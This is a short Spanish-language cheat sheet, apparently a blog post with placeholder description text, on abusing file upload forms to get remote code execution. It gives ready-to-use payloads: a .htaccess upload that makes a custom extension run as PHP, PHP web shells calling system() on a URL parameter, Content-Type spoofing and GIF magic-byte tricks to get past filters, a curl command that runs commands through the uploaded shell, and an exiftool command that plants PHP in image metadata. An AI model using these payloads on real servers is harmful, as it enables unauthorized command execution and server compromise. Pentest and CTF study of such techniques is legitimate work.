---
title: "File upload abuse"
description: "Lorem ipsum dolor sit amet"
pubDate: "Jul 08 2022"
heroImage: "/placeholder-hero.jpg"
---

## .htaccess

```bash

Content-Type: multipart/form-data; boundary=---------------------------376986183714055427691921862140
-----------------------------376986183714055427691921862140
Content-Disposition: form-data; name="toConvert"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .test

-----------------------------376986183714055427691921862140--

# Luego subimos el archivo pwn

Content-Type: multipart/form-data; boundary=---------------------------376986183714055427691921862140
-----------------------------376986183714055427691921862140
Content-Disposition: form-data; name="toConvert"; filename="pwn.test"
Content-Type: text/plain

<?php
  system($_GET['cmd']);
?>

-----------------------------376986183714055427691921862140--

```

## caracteres maximos

```bash

<?php system($_GET['c']); ?>
<?php system($_GET[0 ]); ?>
<?= exec($_GET[0]; ?)>
<?=`$_GET[0]`?>

```

## Tipos de archivos

```bash
Content-Disposition: form-data; name="fileToUpload"; filename='pwn.php'
#Content-Type: application/x-php
Content-Type: image/jpg

<?php system($_GET['c']); ?>

## ##
file cmd.php
# archivo php

## ##
Content-Type: image/gif

GIF8;

<?php system($_GET['c']); ?>

file cmd.php
# ahora cambia a archivo GIF8

xxd cmd.php
#GIF

## ##

curl -s -X GET "http://files.com/uploads/pwd.php" -G --data-urlencode "cmd=id"

```

## Metadatos

```bash
exiftool -Comment='<?php system("id"); ?>' foto.gif


```